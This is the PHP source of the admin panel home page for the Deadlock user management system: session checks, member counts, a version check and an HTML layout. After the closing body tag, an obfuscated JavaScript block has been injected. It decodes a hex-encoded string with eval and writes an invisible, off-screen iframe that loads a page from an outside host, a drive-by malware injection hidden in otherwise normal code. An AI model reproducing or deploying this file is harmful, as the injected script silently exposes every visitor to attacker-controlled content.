<?php
/******************************************************************************
* This file is part of the Deadlock PHP User Management System.               *
*                                                                             *
* File Description: This is the main page of the admin panel.                 *
*                                                                             *
* Deadlock is free software; you can redistribute it and/or modify            *
* it under the terms of the GNU General Public License as published by        *
* the Free Software Foundation; either version 2 of the License, or           *
* (at your option) any later version.                                         *
*                                                                             *
* Deadlock is distributed in the hope that it will be useful,                 *
* but WITHOUT ANY WARRANTY; without even the implied warranty of              *
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the               *
* GNU General Public License for more details.                                *
*                                                                             *
* You should have received a copy of the GNU General Public License           *
* along with Deadlock; if not, write to the Free Software                     *
* Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA  *
******************************************************************************/

// include needed files
require('../db_config.php');
require('../global.php');

// connect to the database
db_connect($mysql['username'],$mysql['password'],$mysql['database'],$mysql['host']);

// assign config options from database to an array
$config = get_config($mysql['prefix']);

debug_mode($config['debug_mode']);

// remove users that have not verified their email after 72 hours if email verification is enabled
if($config['verify_email']=='true' && $config['prune_inactive_users']=='true'){
	PruneInactiveUsers($mysql['prefix']);
}

// start the session
admin_sessions($config['admin_session_expire']);
if(!isset($_SESSION['logged_in'])){
	redirect('./login.php');
}

// Get current version info from deadlock website.
$this_version = $software_version . ' ' . $software_release;
$urlfile = 'http://phpdeadlock.sourceforge.net/DeadlockRelease-1.txt';
$versionurl = @file_get_contents($urlfile);

if($currentversion = @file_get_contents($versionurl)){
	$currentversion = explode(';',$currentversion);
	$latestversion = $currentversion[0] . ' ' . $currentversion[1];

	if($currentversion[0] <= $software_version){
		$upgrade = '<span class="style12">Current</span>';
		$statushint = 'Your installation of Deadlock is current.';
	} else {
		$upgrade = '<span class="style9">Out of date</span>';
		$statushint = 'Your installation of Deadlock is outdated. You should upgrade, as a newer release will usually be more secure.';
	}
} else {
	$latestversion = 'Unknown';
	$upgrade = '<span class="style9">Error</span>';
	$statushint = 'An error occurred while retrieving release information from the Deadlock website. The website could be down, or your server could be preventing Deadlock from connecting to external websites.';
}


$currentmembers = count_users($mysql['prefix']);

if($config['require_admin_accept']=="true"){
	$pendingmembers = '<a href="./userrequests.php">'.count_pending_users($mysql['prefix']).'</a>';
	$pendinghintbox = 'This is the number of requests that are waiting for your approval.';
} else {
	$pendingmembers = 'Disabled';
	$pendinghintbox = 'This feature is disabled in the Deadlock configuration.';
}

if($config['verify_email']=="true"){
	$inactivemembers = '<a href="./inactiveusers.php">'.count_inactive_users($mysql['prefix']).'</a>';
	$inactivehintbox = 'This is the number of users that have not validated their email.';
} else {
	$inactivemembers = 'Disabled';
	$inactivehintbox = 'This feature is disabled in the Deadlock configuration.';
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Deadlock - Admin Panel</title>
<script type="text/javascript" src="../images/hint.js">
/***********************************************
* Show Hint script- © Dynamic Drive (www.dynamicdrive.com)
* This notice MUST stay intact for legal use
* Visit http://www.dynamicdrive.com/ for this script and 100s more.
***********************************************/
</script>
<link href="../images/admin.css" rel="stylesheet" type="text/css" media="all" />
</head>

<body>
<table width="549" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td width="412" height="58"><a href="index.php"><img src="../images/header_logo.gif" width="252" height="58" border="0" /></a></td>
    <td width="137"><div align="right"><img src="../images/tux.gif" width="48" height="48" /></div></td>
  </tr>
  <tr>
    <td height="2" colspan="2"><img src="../images/grey_pixel.gif" width="100%" height="2" /></td>
  </tr>
  
  <tr>
    <td height="34" colspan="2" class="style2">Welcome to the Deadlock administration panel. Here you can manage users, accept new requests, change settings and more. To begin, select a link to the right. </td>
  </tr>
  <tr>
    <td height="171" valign="top"><table width="85%" border="0">
      <tr>
        <td colspan="2"><span class="style5">Protected  Area Infomation</span></td>
      </tr>
      <tr>
        <td width="40%" class="style2">Active Members:</td>
        <td width="60%" class="style2"><a href="./userlist.php"><?=$currentmembers?></a>
          <a href="#" class="hintanchor" onmouseover="showhint('This is the number of registered and approved members currently in the database.', this, event, '150px')">[?]</a></td>
      </tr>
      <tr>
        <td class="style2">Pending Requests:</td>
        <td class="style2"><?=$pendingmembers?>
          <a href="#" class="hintanchor" onmouseover="showhint('<?=$pendinghintbox?>', this, event, '150px')">[?]</a></td>
      </tr>
      <tr>
        <td class="style2">Inactive Users:</td>
        <td class="style2"><?=$inactivemembers?>
          <a href="#" class="hintanchor" onmouseover="showhint('<?=$inactivehintbox?>', this, event, '150px')">[?]</a></td>
      </tr>
    </table>
      <br />
      <table width="85%" border="0" cellpadding="0" cellspacing="0">
        <tr>
          <td colspan="2" class="style5">Deadlock Information</td>
        </tr>
        <tr>
          <td width="40%" class="style2">Version:</td>
          <td width="60%"><span class="style11"><?=$this_version?></span> <a href="#" class="hintanchor" onmouseover="showhint('This is the version of Deadlock in which is installed on your server.', this, event, '150px')">[?]</a></td>
        </tr>
        <tr>
          <td class="style2">Current Version:</td>
          <td><span class="style11"><?=$latestversion?></span> <a href="#" class="hintanchor" onmouseover="showhint('This is the current version of Deadlock available for download.', this, event, '150px')">[?]</a></td>
        </tr>
        <tr>
          <td height="20" class="style2">Status:</td>
          <td><?=$upgrade?> <a href="#" class="hintanchor" onmouseover="showhint('<?=$statushint?>', this, event, '150px')">[?]</a></td>
        </tr>
    </table></td>
    <td height="171" valign="top"><span class="style2"><span class="style5">Navigation Menu</span><br />
<a href="./index.php">Home</a><br />
<a href="./userlist.php">Manage Users</a><br />
<? if($config['require_admin_accept']=='true'): ?><a href="./userrequests.php">User Requests</a><br /><? endif; ?>
<? if($config['verify_email']=='true'): ?><a href="./inactiveusers.php">Inactive Users</a><br /><? endif; ?>
<a href="./bulkemail.php">Bulk Email</a><br />
<br />
<a href="./editconfig.php">Configuration</a><br />
<a href="<?=htmlentities($config['protected_area_url'])?>">My Protected Area</a><br />
<a href="./login.php?cmd=logout">Logout</a></span></td>
  </tr>
  
  <tr>
    <td height="21" colspan="2" class="footercell"><div align="center"><?show_footer($software_signature)?></div></td>
  </tr>
</table>
</body>
   <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . --> </html>    